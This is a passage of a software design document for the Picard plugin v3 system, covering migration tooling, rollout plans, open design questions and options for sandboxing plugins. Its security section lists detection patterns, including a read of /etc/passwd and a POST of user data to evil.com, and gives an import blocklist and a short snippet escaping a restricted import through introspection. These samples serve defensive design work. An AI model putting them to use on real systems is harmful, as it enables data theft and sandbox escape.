    metadata['version'] = re.search(r'PLUGIN_VERSION\s*=\s*["\'](.+?)["\']', code).group(1)
    metadata['description'] = re.search(r'PLUGIN_DESCRIPTION\s*=\s*["\'](.+?)["\']', code).group(1)
    metadata['license'] = re.search(r'PLUGIN_LICENSE\s*=\s*["\'](.+?)["\']', code).group(1)

    # Detect API version
    if 'PLUGIN_API_VERSIONS' in code:
        api_match = re.search(r'PLUGIN_API_VERSIONS\s*=\s*\[(.+?)\]', code)
        metadata['api_versions'] = [v.strip(' "\'') for v in api_match.group(1).split(',')]
    else:
        metadata['api_versions'] = ['2.0']  # Assume v2

    return metadata

def create_v3_structure(new_path, metadata):
    """Create v3 plugin structure"""
    os.makedirs(new_path, exist_ok=True)

    # Generate MANIFEST.toml
    manifest = f"""name = "{metadata['name']}"
author = "{metadata['author']}"
version = "{metadata['version']}"
api = ["3.0"]
license = "{metadata['license']}"

[description]
en = "{metadata['description']}"
"""

    with open(Path(new_path) / 'MANIFEST.toml', 'w') as f:
        f.write(manifest)

def convert_plugin_code(old_path, new_path):
    """Convert plugin code from v2 to v3 API"""
    old_init = Path(old_path) / '__init__.py'
    new_init = Path(new_path) / '__init__.py'

    with open(old_init) as f:
        code = f.read()

    # Remove old metadata (now in MANIFEST.toml)
    code = re.sub(r'PLUGIN_\w+\s*=\s*.+?\n', '', code)

    # Convert register() to enable()
    code = re.sub(
        r'def register\(\):',
        'def enable(api: PluginApi) -> None:',
        code
    )

    # Convert old API calls to new API
    conversions = {
        'register_album_metadata_processor': 'api.register_album_metadata_processor',
        'register_track_metadata_processor': 'api.register_track_metadata_processor',
        'register_file_post_load_processor': 'api.register_file_post_load_processor',
        'register_cover_art_provider': 'api.register_cover_art_provider',
        'register_script_function': 'api.register_script_function',
        'register_album_action': 'api.register_album_action',
        'register_track_action': 'api.register_track_action',
        'register_file_action': 'api.register_file_action',
        'register_options_page': 'api.register_options_page',
    }

    for old_call, new_call in conversions.items():
        code = code.replace(old_call, new_call)

    # Add imports
    if 'from picard.plugin3.api import PluginApi' not in code:
        code = 'from picard.plugin3.api import PluginApi\n\n' + code

    # Add disable() stub if not present
    if 'def disable' not in code:
        code += '\n\ndef disable() -> None:\n    pass\n'

    with open(new_init, 'w') as f:
        f.write(code)

    return code

def generate_report(new_path):
    """Generate migration report with manual review items"""
    report = []

    init_file = Path(new_path) / '__init__.py'
    with open(init_file) as f:
        code = f.read()

    # Check for issues that need manual review
    if 'from picard import config' in code:
        report.append("⚠️  Uses global config - update to use api.global_config or api.plugin_config")

    if 'from picard import log' in code:
        report.append("⚠️  Uses global log - update to use api.logger")

    if 'from picard.ui' in code:
        report.append("⚠️  Uses UI imports - may need Qt5→Qt6 updates")

    if 'tagger.window' in code:
        report.append("⚠️  Accesses tagger.window directly - not available in v3 API")

    if 'QtGui' in code or 'QtCore' in code:
        report.append("⚠️  Uses Qt5 imports - update to Qt6 (PyQt5→PyQt6)")

    # Save report
    report_file = Path(new_path) / 'MIGRATION_REPORT.txt'
    with open(report_file, 'w') as f:
        f.write("Plugin Migration Report\n")
        f.write("=" * 50 + "\n\n")

        if report:
            f.write("Items requiring manual review:\n\n")
            for item in report:
                f.write(f"{item}\n")
        else:
            f.write("✓ No obvious issues found.\n")
            f.write("  Please test thoroughly before release.\n")

        f.write("\n" + "=" * 50 + "\n")
        f.write("Next steps:\n")
        f.write("1. Review MIGRATION_REPORT.txt\n")
        f.write("2. Test plugin with Picard 3\n")
        f.write("3. Update git repository\n")
        f.write("4. Submit to plugin registry\n")

    print(f"✓ Migration complete. See {report_file} for manual review items.")
```

**C) API Compatibility Shim (Limited)**

For very simple plugins, provide compatibility layer:

```python
# picard/plugin3/compat.py
"""Limited compatibility layer for simple v2 plugins"""

def register_album_metadata_processor(func, priority=0):
    """v2 compatibility - auto-inject api"""
    from picard.plugin3.manager import get_current_plugin_api
    api = get_current_plugin_api()
    api.register_album_metadata_processor(func, priority)

# Similar for other common functions
```

**Limitations:**
- Only works for simple plugins
- Cannot handle UI code
- Cannot handle direct tagger access

---

**4. Communication Plan**

**Before Picard 3.0 release:**
- Announce breaking change 6 months in advance
- Publish migration guide
- Offer migration assistance to popular plugin authors
- Create migration tool

**At Picard 3.0 release:**
- Clear release notes about plugin incompatibility
- Link to migration guide
- List of already-migrated plugins
- Keep Picard 2.x available for download

**After Picard 3.0 release:**
- Support both 2.x and 3.x for 6-12 months
- Help plugin developers migrate
- Eventually deprecate 2.x

---

**5. Migration Checklist for Plugin Developers**

```markdown
## Plugin Migration Checklist

### Structure
- [ ] Create new directory structure
- [ ] Create MANIFEST.toml with metadata
- [ ] Remove metadata from __init__.py

### Code Changes
- [ ] Change `register()` to `enable(api: PluginApi)`
- [ ] Add `disable()` function (optional)
- [ ] Update all API calls to use `api.` prefix
- [ ] Replace `from picard import config` with `api.global_config` or `api.plugin_config`
- [ ] Replace `from picard import log` with `api.logger`
- [ ] Update Qt5 imports to Qt6 (PyQt5 → PyQt6)
- [ ] Remove direct `tagger` access, use API methods

### Testing
- [ ] Test with Picard 3.0
- [ ] Verify all functionality works
- [ ] Check for deprecation warnings
- [ ] Test enable/disable

### Distribution
- [ ] Create git repository
- [ ] Push to GitHub/GitLab
- [ ] Submit to plugin registry
- [ ] Update documentation
```

---

**6. Example: Before and After**

**Before (v2):**
```python
# __init__.py
PLUGIN_NAME = "Example Plugin"
PLUGIN_AUTHOR = "John Doe"
PLUGIN_VERSION = "1.0.0"
PLUGIN_API_VERSIONS = ["2.0"]
PLUGIN_LICENSE = "GPL-2.0"
PLUGIN_DESCRIPTION = "Example plugin"

from picard import log, config
from picard.metadata import register_track_metadata_processor

def process_track(album, metadata, track, release):
    log.info("Processing track")
    if config.setting['example_enabled']:
        metadata['example'] = 'value'

def register():
    register_track_metadata_processor(process_track)
```

**After (v3):**
```toml
# MANIFEST.toml
name = "Example Plugin"
author = "John Doe"
version = "1.0.0"
api = ["3.0"]
license = "GPL-2.0"

[description]
en = "Example plugin"
```

```python
# __init__.py
from picard.plugin3.api import PluginApi

def process_track(album, metadata, track, release):
    # Use api.logger instead of global log
    # Access via closure or pass api as parameter
    pass

def enable(api: PluginApi) -> None:
    api.logger.info("Plugin enabled")

    # Wrap to access api
    def process_with_api(album, metadata, track, release):
        api.logger.info("Processing track")
        if api.plugin_config['enabled']:
            metadata['example'] = 'value'

    api.register_track_metadata_processor(process_with_api)

def disable() -> None:
    pass
```

---

**Decision:** CLOSED - Clean break with migration tools

**Timeline:**
- Picard 2.12 (6 months before 3.0): Announce breaking change
- Picard 2.13: Release migration tool
- Picard 3.0: Plugin v3 only, v2 plugins don't load
- Picard 2.x: Maintained for 6-12 months alongside 3.x

---

## Success Metrics

### Phase 1 Complete When:
- [ ] Can install plugin from git URL
- [ ] Can enable/disable plugin
- [ ] Plugin state persists across restarts
- [ ] Can update plugins
- [ ] Can uninstall plugins
- [ ] Incompatible plugins are rejected
- [ ] Blacklisted plugins are blocked (with override option)
- [ ] All operations have proper error handling
- [ ] CLI provides useful feedback

### Phase 2 Complete When:
- [ ] Test coverage >80%
- [ ] Documentation complete
- [ ] Migration guide published
- [ ] No known critical bugs

### Phase 3 Complete When:
- [ ] Website serves plugin registry JSON
- [ ] Picard fetches and caches registry
- [ ] Can browse official plugins via CLI
- [ ] Can search official plugins
- [ ] Can install official plugins by name
- [ ] Blacklist is enforced on install and startup
- [ ] Admin interface exists for managing plugins/blacklist

---

## Timeline Estimate

| Phase | Duration | Dependencies |
|-------|----------|--------------|
| Phase 1.1 | 2-3 days | None |
| Phase 1.2 | 1 day | None |
| Phase 1.3 | 2 days | 1.1, 1.2 |
| Phase 1.4 | 1-2 days | 1.1 |
| Phase 1.5 | 1 day | 1.1 |
| Phase 1.6 | 1-2 days | None |
| Phase 1.7 | 1 day | 1.1 |
| Phase 1.8 | 1 day | None |
| **Phase 1 Total** | **10-13 days** | |
| Phase 2 | 5-6 days | Phase 1 |
| **MVP Total** | **15-19 days** | |
| Phase 3 | 6-9 days | Phase 2 |
| **Full CLI Total** | **21-28 days** | |

---

## Next Actions

### Immediate (This Week)
1. **Merge phw/plugins-v3-cli into phw/plugins-v3** - consolidate branches
2. **Implement Phase 1.1** - config persistence (blocker for everything else)
3. **Implement Phase 1.2** - version checking (safety critical)

### Short Term (Next 2 Weeks)
4. Implement Phase 1.3 - better CLI output
5. Implement Phase 1.4 - updates
6. Implement Phase 1.5 - state management

### Medium Term (Next Month)
7. Complete Phase 1 (1.6, 1.7)
8. Start Phase 2 - testing and docs

---

## Notes

- Focus on CLI-only for now - GUI can wait
- Prioritize robustness over features
- Make decisions on open questions as needed, document them
- Keep implementation simple - can enhance later
- Test with real plugins early and often

---

## Summary of Open Questions

### ✅ Resolved Questions

| # | Question | Decision | Rationale |
|---|----------|----------|-----------|
| Q1 | Install/uninstall hooks? | **NO** | Keep simple, use enable/disable instead |
| Q2 | Is TOML right format? | **YES** | Already works, Python 3.11+ native support |
| Q5 | Blacklisting plugins? | **Website-based** | Centralized, updateable without app release |
| Q6 | Categorization? | **YES - dual system** | Category (functional) + Trust level (security) |
| Q7 | Extra data files API? | **NO special API** | Use standard Python pathlib |
| Q8 | Additional extension points? | **Add as needed** | Current set covers 90% of cases |
| Q9 | ZIP plugin support? | **NO** | Git-only for v3, simpler |
| Q10 | Manifest field format? | **Simple strings** | `author` (string), `name` (string) |
| Q11 | Multi-lingual name? | **NO** | Name is identifier, description is i18n |
| Q12 | Legacy coexistence? | **Parallel systems** | Both work during transition |

### ⚠️ Open Questions Requiring Decisions

#### 1. Plural Forms Implementation

**Question:** Should we use babel library or manual CLDR rules for plural forms?

**Options:**
- **A) Use babel library** (recommended)
  - ✅ Complete CLDR rules for all languages
  - ✅ Maintained by experts
  - ❌ Adds dependency

- **B) Manual rules for common languages**
  - ✅ No extra dependency
  - ❌ Incomplete coverage
  - ❌ Maintenance burden

**Impact:** Phase 2 implementation
**Recommendation:** Use babel
**Decision needed by:** Before implementing translation system

---

#### 2. Plugin Directory Name Derivation

**Question:** How to derive plugin directory name when installing from git URL?

**Current approach:** Use basename of URL
```bash
# URL: https://github.com/user/picard-plugin-lastfm
# Directory: picard-plugin-lastfm
```

**Problem:** Could conflict, not user-friendly

**Options:**
- **A) Use URL basename** (current)
  - ✅ Simple
  - ❌ Can be long/ugly
  - ❌ Potential conflicts

- **B) Use plugin ID from MANIFEST after clone**
  - ✅ Clean names
  - ✅ Matches plugin identity
  - ❌ Must clone first to read manifest
  - ❌ What if manifest invalid?

- **C) Let user specify name**
  - ✅ User control
  - ❌ Extra complexity
  - Example: `--install <url> --name lastfm`

**Impact:** Phase 1.7
**Recommendation:** Option B with fallback to A
**Decision needed by:** Phase 1.7 implementation

---

#### 3. Plugin Update Notifications

**Question:** How should users be notified of available plugin updates?

**Options:**
- **A) Check on startup** (like Picard core updates)
  - ✅ Automatic
  - ❌ Slows startup

- **B) Check periodically in background**
  - ✅ Non-blocking
  - ❌ More complex

- **C) Manual check only** (`--check-updates`)
  - ✅ Simple
  - ❌ Users might miss updates

- **D) Show in UI only** (no CLI notifications)
  - ✅ Less intrusive
  - ❌ CLI users miss updates

**Impact:** Phase 1.4 and Phase 4 (GUI)
**Recommendation:** C for Phase 1, A for Phase 4
**Decision needed by:** Phase 1.4 implementation

---

#### 4. Plugin Configuration Cleanup

**Question:** What happens to plugin config when plugin is uninstalled?

**Options:**
- **A) Keep config** (allow reinstall to restore settings)
  - ✅ User-friendly
  - ❌ Config accumulates

- **B) Delete config** (clean uninstall)
  - ✅ Clean
  - ❌ Lose settings on reinstall

- **C) Ask user** (prompt on uninstall)
  - ✅ User choice
  - ❌ Extra prompt

- **D) Keep config, add `--purge` flag**
  - ✅ Flexible
  - ✅ Safe default
  - Example: `--uninstall plugin --purge`

**Impact:** Phase 1.7
**Recommendation:** Option D
**Decision needed by:** Phase 1.7 implementation

---

#### 5. Plugin Dependencies

**Question:** Should plugins be able to declare dependencies on other plugins?

**Current state:** Not supported

**Use case:** Plugin A requires Plugin B to function

**Options:**
- **A) No dependencies** (current)
  - ✅ Simple
  - ❌ Plugins can't build on each other

- **B) Declare in MANIFEST, auto-install**
  - ✅ Automatic
  - ❌ Complex dependency resolution
  - Example: `dependencies = ["plugin-b>=1.0"]`

- **C) Declare in MANIFEST, warn only**
  - ✅ Simple
  - ✅ Informs user
  - ❌ Manual install needed

**Impact:** Phase 2 or later
**Recommendation:** Option A for now, revisit if needed
**Decision needed by:** Phase 2 or when use case arises

---

#### 6. Plugin Sandboxing / Security

**Question:** Should plugins run in any kind of sandbox or with restricted permissions?

**Current state:** Plugins have full access to Picard internals

**Security concerns:**
- Malicious plugins can access file system
- Can make network requests
- Can execute arbitrary code
- Can access user's music files
- Can steal credentials from config

---

### Python Sandboxing Reality Check

**Hard truth:** Python is extremely difficult to sandbox effectively.

**Why Python sandboxing is hard:**
- Dynamic language - can modify itself at runtime
- `import` can load arbitrary modules
- `exec()` and `eval()` can run arbitrary code
- Can access `__builtins__`, `sys`, `os` through introspection
- Can break out of most restrictions using introspection
- No built-in security model like Java's SecurityManager

**Historical attempts that failed:**
- `rexec` / `Bastion` - Removed from Python 2.6 (too many exploits)
- `pysandbox` - Abandoned, author declared it impossible
- `RestrictedPython` - Only works for very limited use cases

**Quote from pysandbox author:**
> "After having work during 3 years on a pysandbox project to sandbox Python, I now reached a point where I am convinced that pysandbox is broken by design."

---

### Realistic Options for Plugin Security

#### Option A: No Sandboxing (Current) ⭐ RECOMMENDED

**Approach:** Trust-based system with social/organizational controls

**Security measures:**
- ✅ Trust levels (picard_team / trusted_author / community)
- ✅ Blacklist for known malicious plugins
- ✅ Clear warnings for community plugins
- ✅ Code review for Picard Team plugins
- ✅ Reputation system for trusted authors
- ✅ User education about risks

**Pros:**
- ✅ Simple to implement
- ✅ No performance overhead
- ✅ Plugins have full capabilities
- ✅ Matches how most plugin systems work (VSCode, Sublime, etc.)

**Cons:**
- ❌ Malicious plugin can do anything
- ❌ Relies on user judgment

**Mitigation:**
```python
# Show clear warning for community plugins
if plugin.trust_level == 'community':
    print("""
    ⚠️  WARNING: This plugin is not reviewed by the Picard team.

    This plugin will have full access to:
    - Your music files
    - Your Picard configuration (including passwords)
    - Your file system
    - Network access

    Only install if you trust the author.

    Plugin: {name}
    Author: {author}
    Source: {git_url}
    """)
```

---

#### Option B: Process Isolation

**Approach:** Run plugins in separate processes with IPC

**Architecture:**
```
Picard Main Process
    ↓ (IPC: pipes/sockets)
Plugin Process 1 (sandboxed)
Plugin Process 2 (sandboxed)
Plugin Process 3 (sandboxed)
```

**Implementation:**
```python
# Each plugin runs in subprocess
plugin_process = subprocess.Popen(
    ['python', '-m', 'picard.plugin_runner', plugin_name],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    # Restrict with OS-level controls
)

# Communicate via IPC
plugin_process.stdin.write(json.dumps({
    'action': 'process_metadata',
    'data': metadata
}))
result = json.loads(plugin_process.stdout.readline())
```

**OS-level restrictions (Linux):**
```python
import os
import resource

def run_plugin_sandboxed():
    # Drop privileges
    os.setuid(plugin_user_id)

    # Limit resources
    resource.setrlimit(resource.RLIMIT_CPU, (60, 60))  # 60 sec CPU
    resource.setrlimit(resource.RLIMIT_AS, (512*1024*1024, 512*1024*1024))  # 512MB RAM

    # Restrict file access (would need seccomp/AppArmor)
    # ...
```

**Pros:**
- ✅ True isolation
- ✅ Plugin crash doesn't crash Picard
- ✅ Can limit CPU/memory per plugin
- ✅ Can use OS-level security (seccomp, AppArmor, SELinux)

**Cons:**
- ❌ Very complex to implement
- ❌ High performance overhead (IPC for every call)
- ❌ Difficult to design API (everything must serialize)
- ❌ Platform-specific (Linux vs macOS vs Windows)
- ❌ Plugins can't access Qt UI directly
- ❌ Breaks most existing plugin patterns

**Verdict:** Too complex for benefit gained

---

#### Option C: Limited API Surface

**Approach:** Only expose safe, controlled APIs to plugins

**Implementation:**
```python
class PluginApi:
    # Safe: Only exposes controlled methods
    def get_metadata(self, file_id):
        """Get metadata - read-only, safe"""
        return self._tagger.get_file(file_id).metadata

    def set_metadata(self, file_id, key, value):
        """Set metadata - validated, safe"""
        if not self._validate_tag_name(key):
            raise ValueError("Invalid tag name")
        file = self._tagger.get_file(file_id)
        file.metadata[key] = value

    # Dangerous: Don't expose
    # def get_tagger(self):
    #     return self._tagger  # Would give full access!
```

**Restrict imports:**
```python
# In plugin loader
import sys
import builtins

# Override __import__ to restrict modules
original_import = builtins.__import__

def restricted_import(name, *args, **kwargs):
    # Whitelist safe modules
    allowed = [
        're', 'json', 'datetime', 'math', 'urllib.parse',
        'picard.plugin3.api',  # Only our API
    ]

    # Blacklist dangerous modules
    forbidden = [
        'os', 'sys', 'subprocess', 'socket', 'eval', 'exec',
        '__builtin__', '__builtins__',
    ]

    if name in forbidden:
        raise ImportError(f"Module {name} is not allowed in plugins")

    if name not in allowed and not name.startswith('picard.plugin3'):
        raise ImportError(f"Module {name} is not whitelisted")

    return original_import(name, *args, **kwargs)

builtins.__import__ = restricted_import
```

**Pros:**
- ✅ Limits attack surface
- ✅ No performance overhead
- ✅ Relatively simple

**Cons:**
- ❌ Can be bypassed through introspection
- ❌ Limits plugin capabilities
- ❌ Hard to maintain whitelist
- ❌ Breaks legitimate use cases

**Example bypass:**
```python
# Plugin can still access dangerous stuff
import picard.plugin3.api
api = picard.plugin3.api.PluginApi(...)

# Get to tagger through api
tagger = api._tagger  # Oops, private but accessible

# Get to os module through tagger
import sys
os = sys.modules['os']  # Bypassed!

# Or through introspection
os = api.__class__.__module__.__builtins__['__import__']('os')
```

**Verdict:** Provides false sense of security

---

#### Option D: Static Analysis + Code Review

**Approach:** Scan plugin code for dangerous patterns before approval

**Tools:**
```bash
# Scan for dangerous patterns
bandit plugin_code.py  # Security linter
pylint plugin_code.py  # Code quality
semgrep --config=plugin-security.yml plugin_code.py  # Pattern matching
```

**Dangerous patterns to detect:**
```python
# Flag these in code review
import os
import subprocess
import socket
eval()
exec()
__import__()
open('/etc/passwd')
requests.post('https://evil.com', data=user_data)
```

**Automated checks:**
```python
def scan_plugin_security(plugin_path):
    """Scan plugin for security issues"""
    issues = []

    with open(plugin_path) as f:
        code = f.read()

    # Check for dangerous imports
    if 'import os' in code or 'from os import' in code:
        issues.append("Uses 'os' module - can access file system")

    if 'import subprocess' in code:
        issues.append("Uses 'subprocess' - can execute commands")

    # Check for eval/exec
    if 'eval(' in code or 'exec(' in code:
        issues.append("Uses eval/exec - can run arbitrary code")

    # Check for network access
    if 'requests.' in code or 'urllib' in code or 'socket' in code:
        issues.append("Makes network requests - can exfiltrate data")

    return issues
```

**Pros:**
- ✅ Catches obvious malicious code
- ✅ Educational for developers
- ✅ No runtime overhead
- ✅ Works with full plugin capabilities

**Cons:**
- ❌ Can't catch obfuscated code
- ❌ False positives (legitimate uses)
- ❌ Only works for reviewed plugins
- ❌ Doesn't prevent runtime attacks

**Verdict:** Good complement to trust levels, not a complete solution

---

#### Option E: Capability-Based Security

**Approach:** Plugins declare required capabilities, user approves

**MANIFEST.toml:**
```toml
name = "Last.fm Plugin"
version = "1.0.0"

[capabilities]
network = true           # Needs network access
filesystem_read = true   # Can read files
filesystem_write = false # Cannot write files
config_access = true     # Can access config
```

**Installation prompt:**
```bash
$ picard plugins --install lastfm

Plugin "Last.fm" requests the following permissions:
  ✓ Network access - to scrobble tracks
  ✓ Read file system - to read music files
  ✓ Access configuration - to store credentials
  ✗ Write file system - NOT REQUESTED

Continue? [y/N]
```

**Runtime enforcement:**
```python
class PluginApi:
    def __init__(self, manifest, tagger):
        self._capabilities = manifest.capabilities

    def make_network_request(self, url):
        if not self._capabilities.get('network'):
            raise PermissionError("Plugin does not have network capability")
        # ... make request
```

**Pros:**
- ✅ User awareness of plugin behavior
- ✅ Principle of least privilege
- ✅ Can revoke capabilities later
- ✅ Audit trail of what plugins can do

**Cons:**
- ❌ Can't enforce in Python (plugins can bypass)
- ❌ Users might not understand permissions
- ❌ Adds friction to installation
- ❌ Doesn't prevent malicious code if capability granted

**Verdict:** Good for transparency, not for enforcement

---

### Recommended Approach: Defense in Depth

**Combine multiple strategies:**

**1. Trust Levels (Primary defense)**
- Picard Team: Full code review
- Trusted Authors: Reputation-based trust
- Community: Clear warnings

**2. Static Analysis (Secondary defense)**
- Automated scans for Picard Team plugins
- Flag suspicious patterns
- Require explanation for dangerous APIs

**3. Capability Declaration (Transparency)**
- Plugins declare what they need
- Show to users during install
- Not enforced, but documented

**4. User Education (Critical)**
- Clear warnings for community plugins
- Explain risks in documentation
- "Only install plugins you trust"

**5. Rapid Response (Mitigation)**
- Blacklist for known malicious plugins
- Fast update mechanism
- Community reporting

**6. Code Signing (Future)**
- Sign Picard Team plugins
- Verify signature on load
- Doesn't prevent malicious code, but proves authenticity

---

### Implementation Recommendation

**Phase 1: Trust Levels + Warnings**
```python
def install_plugin(url, trust_level):
    if trust_level == 'community':
        show_security_warning()
        if not user_confirms():
            return

    # Install plugin
    clone_repository(url)
    enable_plugin()
```

**Phase 2: Capability Declaration**
```toml
# In MANIFEST.toml
[capabilities]
network = true
filesystem = "read"  # read, write, or none
config = true
```

**Phase 3: Static Analysis**
```python
# For Picard Team plugins
def review_plugin(plugin_path):
    issues = scan_security_issues(plugin_path)
    if issues:
        print("Security review required:")
        for issue in issues:
            print(f"  - {issue}")
```

**Phase 4: Code Signing (Optional)**
```python
# Sign Picard Team plugins
def sign_plugin(plugin_path, private_key):
    signature = sign(plugin_path, private_key)
    save_signature(signature)

# Verify on load
def load_plugin(plugin_path):
    if plugin.trust_level == 'picard_team':
        if not verify_signature(plugin_path):
            raise SecurityError("Invalid signature")
```

---

### Comparison with Other Plugin Systems

| System | Approach | Enforcement |
|--------|----------|-------------|
| **VSCode** | Trust-based, marketplace review | None |
| **Sublime Text** | Trust-based, package control | None |
| **Vim** | Trust-based, no review | None |
| **Firefox** | Code review + sandboxing (WebExtensions) | Strong (separate process) |
| **Chrome** | Code review + sandboxing (extensions) | Strong (separate process) |
| **Electron** | Node.js context isolation | Medium (can be bypassed) |
| **Python pip** | Trust-based, PyPI review | None |

**Observation:** Most successful plugin systems for desktop apps use trust-based models, not sandboxing.

---

### Final Recommendation

**Option A: Trust-based system with defense in depth**

**Rationale:**
1. Python sandboxing is impractical and provides false security
2. Process isolation is too complex for the benefit
3. Trust levels + warnings + blacklist is proven approach
4. Matches user expectations (like VSCode, Sublime)
5. Allows full plugin capabilities
6. Can add static analysis and capabilities later

**Security model:**
- Picard Team plugins: Reviewed, signed, trusted
- Trusted Author plugins: Reputation-based, minimal warning
- Community plugins: Clear warnings, user responsibility
- Blacklist: Fast response to malicious plugins
- User education: Document risks clearly

**Accept:** Plugins are trusted code. Focus on preventing malicious plugins from being installed, not on sandboxing after installation.

---

**Impact:** Architecture decision
**Recommendation:** Option A with defense in depth
**Decision needed by:** Phase 1 (document decision)

---

#### 7. Plugin Versioning in Registry

**Question:** Should registry track multiple versions of each plugin?

**Current design:** Registry points to git URL, versions come from git tags

**Options:**
- **A) Git-based only** (current)
  - ✅ Simple
  - ✅ Git is source of truth
  - ❌ Can't recommend specific version

- **B) Registry tracks versions**
  - ✅ Can mark versions as stable/beta
  - ✅ Can recommend specific version
  - ❌ More complex
  - Example: `"recommended_version": "v1.2.0"`

**Impact:** Phase 3 registry design
**Recommendation:** Option A for now, B if needed later
**Decision needed by:** Phase 3.1 implementation

---

#### 8. Plugin Disable vs Unload

**Question:** Should disabled plugins stay loaded in memory or be unloaded?

**Current design:** Disable calls `disable()` and unregisters hooks

**Options:**
- **A) Keep loaded** (current)
  - ✅ Fast re-enable
  - ❌ Uses memory

- **B) Unload module**
  - ✅ Frees memory
  - ❌ Harder to re-enable
  - ❌ Python module unloading is tricky

**Impact:** Phase 1.5
**Recommendation:** Option A (keep loaded)
**Decision needed by:** Phase 1.5 implementation

---

#### 9. Weblate Project Structure

**Question:** How to organize plugins in Weblate?

**Options:**
- **A) One component per plugin**
  - ✅ Separate translation progress per plugin
  - ✅ Plugin-specific translators
  - ❌ Many components to manage

- **B) Single component for all plugins**
  - ✅ Simpler management
  - ✅ Shared translation memory
  - ❌ Can't track per-plugin progress

- **C) Group by trust level**
  - Picard Team plugins: one component
  - Trusted/Community: separate components
  - ✅ Prioritize team plugins
  - ❌ More complex

**Impact:** Phase 2 Weblate setup
**Recommendation:** Option A
**Decision needed by:** Phase 2 (before Weblate setup)

---

#### 10. Plugin Testing / CI

**Question:** Should official plugins be required to have tests?

**Current state:** No requirement

**Options:**
- **A) No requirement**
  - ✅ Lower barrier to entry
  - ❌ Quality varies

- **B) Required for Picard Team plugins only**
  - ✅ Quality for team plugins
  - ✅ Reasonable requirement
  - ❌ Trusted authors might not have tests

- **C) Required for all official plugins**
  - ✅ High quality
  - ❌ High barrier to entry
  - ❌ Excludes simple plugins

**Impact:** Phase 3 submission process
**Recommendation:** Option B
**Decision needed by:** Phase 3.1 (submission workflow)

---

#### 11. Plugin Metrics / Analytics

**Question:** Should Picard collect anonymous plugin usage statistics?

**Use case:** Help prioritize which plugins to maintain/improve

**Options:**
- **A) No metrics** (current)
  - ✅ Privacy-friendly
  - ❌ No usage data

- **B) Opt-in anonymous metrics**
  - ✅ Respects privacy
  - ✅ Useful data
  - ❌ Low opt-in rate
  - Example: "Send anonymous plugin usage stats?"

- **C) Opt-out metrics**
  - ✅ Better data coverage
  - ❌ Privacy concerns

**Impact:** Future feature
**Recommendation:** Option B if implemented
**Decision needed by:** Post-MVP (Phase 4+)

---

#### 12. Plugin Rollback

**Question:** Should users be able to rollback to previous plugin version?

**Current design:** Update overwrites current version

**Options:**
- **A) No rollback** (current)
  - ✅ Simple
  - ❌ Can't undo bad update

- **B) Keep previous version**
  - ✅ Can rollback
  - ❌ Uses disk space
  - Example: `--rollback plugin`

- **C) Use git history**
  - ✅ No extra storage
  - ✅ Can go to any previous commit
  - ❌ Requires git knowledge
  - Example: `--switch-ref plugin <old-commit>`

**Impact:** Phase 1.4 (updates)
**Recommendation:** Option C (already supported via --switch-ref)
**Decision needed by:** Document in Phase 1.4

---

### 📋 Questions for Future Consideration

These don't block MVP but should be considered later:

1. **Plugin marketplace UI** - Should there be a web-based plugin browser?
2. **Plugin ratings/reviews** - Allow users to rate plugins?
3. **Plugin screenshots** - Show screenshots in registry?
4. **Plugin changelogs** - Standardized changelog format?
5. **Plugin search ranking** - How to rank search results?
6. **Plugin recommendations** - Suggest plugins based on usage?
7. **Plugin bundles** - Install multiple related plugins at once?
8. **Plugin API versioning** - How to handle API changes gracefully?
9. **Plugin hot reload** - Reload plugins without restarting Picard?
10. **Plugin profiling** - Help developers optimize plugin performance?

---

## Decision Priority

**Must decide before Phase 1 complete:**
- #2 (Plugin directory names) - Phase 1.7
- #4 (Config cleanup) - Phase 1.7
- #6 (Security model) - Document decision
- #8 (Disable vs unload) - Phase 1.5

**Must decide before Phase 2 complete:**
- #1 (Plural forms) - Translation implementation
- #9 (Weblate structure) - Weblate setup

**Must decide before Phase 3 complete:**
- #3 (Update notifications) - User experience
- #7 (Registry versioning) - Registry design
- #10 (Plugin testing) - Submission requirements

**Can defer to Phase 4+:**
- #5 (Dependencies) - If use case arises
- #11 (Metrics) - Privacy discussion needed
- #12 (Rollback) - Already covered by git refs

---

#### 13. Plugin Repository Migration

**Question:** How to handle a plugin moving to a different git repository?

**Use cases:**
- Plugin moves from personal repo to organization (e.g., `github.com/user/plugin` → `github.com/metabrainz/plugin`)
- Plugin moves between hosting services (GitHub → GitLab)
- Plugin renamed or reorganized
- Author transfers ownership

**Current problem:**
- Plugin installed from old URL
- Registry updated with new URL
- User's installed plugin doesn't update (different git URL)

---

**Proposed Solution: Repository Redirects in Registry**

Add `repository_redirects` section to registry:

```json
{
  "repository_redirects": [
    {
      "old_url": "https://github.com/user/picard-plugin-lastfm",
      "new_url": "https://github.com/metabrainz/picard-plugin-lastfm",
      "redirect_date": "2025-11-20T10:00:00Z",
      "reason": "Plugin moved to official MusicBrainz organization"
    },
    {
      "old_url": "https://github.com/olduser/plugin",
      "new_url": "https://gitlab.com/newuser/plugin",
      "redirect_date": "2025-11-15T14:00:00Z",
      "reason": "Author moved to GitLab"
    }
  ]
}
```

**Implementation:**

```python
class PluginRegistry:
    def get_canonical_url(self, git_url):
        """Get canonical URL, following redirects"""
        registry = self.fetch_registry()

        # Follow redirect chain (max 5 hops to prevent loops)
        for _ in range(5):
            for redirect in registry.get('repository_redirects', []):
                if redirect['old_url'] == git_url:
                    log.info('Plugin repository redirect: %s → %s',
                            git_url, redirect['new_url'])
                    git_url = redirect['new_url']
                    break
            else:
                # No redirect found, this is canonical
                break

        return git_url

    def get_redirect_info(self, old_url):
        """Get redirect information for old URL"""
        registry = self.fetch_registry()
        for redirect in registry.get('repository_redirects', []):
            if redirect['old_url'] == old_url:
                return redirect
        return None

class PluginManager:
    def init_plugins(self):
        """Initialize plugins on startup"""
        registry = PluginRegistry()

        for plugin in self._plugins:
            # Check if plugin URL has been redirected
            canonical_url = registry.get_canonical_url(plugin.git_url)

            if canonical_url != plugin.git_url:
                redirect_info = registry.get_redirect_info(plugin.git_url)
                log.warning(
                    'Plugin "%s" repository has moved:\n'
                    '  Old: %s\n'
                    '  New: %s\n'
                    '  Reason: %s',
                    plugin.name, plugin.git_url, canonical_url,
                    redirect_info['reason']
                )

                # Update plugin's git URL in config
                self._update_plugin_url(plugin.name, canonical_url)
                plugin.git_url = canonical_url

            # Continue loading normally
            # ...
```

**User experience:**

```bash
# On startup
[INFO] Plugin 'lastfm' repository has moved:
       Old: https://github.com/user/picard-plugin-lastfm
       New: https://github.com/metabrainz/picard-plugin-lastfm
       Reason: Plugin moved to official MusicBrainz organization

       Plugin will now update from new location.

# On update
